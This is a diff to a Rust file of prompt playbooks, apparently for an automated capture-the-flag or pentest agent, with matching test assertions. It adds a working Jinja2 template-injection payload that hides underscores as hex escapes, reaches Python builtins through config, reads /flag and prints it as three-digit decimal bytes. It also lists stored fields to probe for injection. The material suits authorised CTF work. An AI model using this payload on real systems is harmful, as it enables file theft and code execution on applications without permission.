@@ -105,10 +105,10 @@ pub const PLAYBOOKS: &[Playbook] = &[
                  use `attr('\\x5f\\x5fclass\\x5f\\x5f')`, `attr('\\x5f\\x5finit\\x5f\\x5f')`, \
                  `attr('\\x5f\\x5fglobals\\x5f\\x5f')`, and `attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')`.\n\
                - If the rendered value must match a numeric regex like `[0-9.]*`, do not print `id` \
-                 or `FLAG{...}` directly. Print fixed-width decimal bytes from `/flag` using a command \
-                 string with no raw dot/underscore, e.g. \
-                 `python3 -c 'print(getattr(\"\",\"join\")(map(lambda c:format(ord(c),\"03d\"),getattr(open(\"/flag\"),\"read\")())),end=\"\")'`, \
-                 then locally decode 3-digit chunks back to `FLAG{...}` before reporting/submitting.\n\
+                 or `FLAG{...}` directly. Print fixed-width decimal bytes from `/flag` with a Jinja-only \
+                 statement payload that contains no raw `_`, `.`, or `[]`, e.g. \
+                 `{% set b=config|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f') %}{% set f=b|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('open')('/flag')|attr('read')() %}{% for c in f %}{% print '%03d'|format(b|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('ord')(c)) %}{% endfor %}`. \
+                 Extract `loan_principal`, then locally decode 3-digit chunks back to `FLAG{...}` before reporting/submitting.\n\
                - Test stored fields rendered later: profile name, address, notes, loan purpose, \
                  comments, and admin-visible pages. A rejected calculator field does not clear \
                  stored profile SSTI.\n\
@@ -473,6 +473,8 @@ mod tests {
         assert!(prompt.contains("{% print 7*7 %}"));
         assert!(prompt.contains("attr('\\x5f\\x5fclass\\x5f\\x5f')"));
         assert!(prompt.contains("fixed-width decimal bytes"));
+        assert!(prompt.contains("{% set b=config|attr('\\x5f\\x5fclass"));
+        assert!(prompt.contains("'%03d'|format"));
         assert!(prompt.contains("3-digit chunks"));
         assert!(prompt.contains("stored fields rendered later"));
         assert!(prompt.contains("Flask/Jinja targets"));
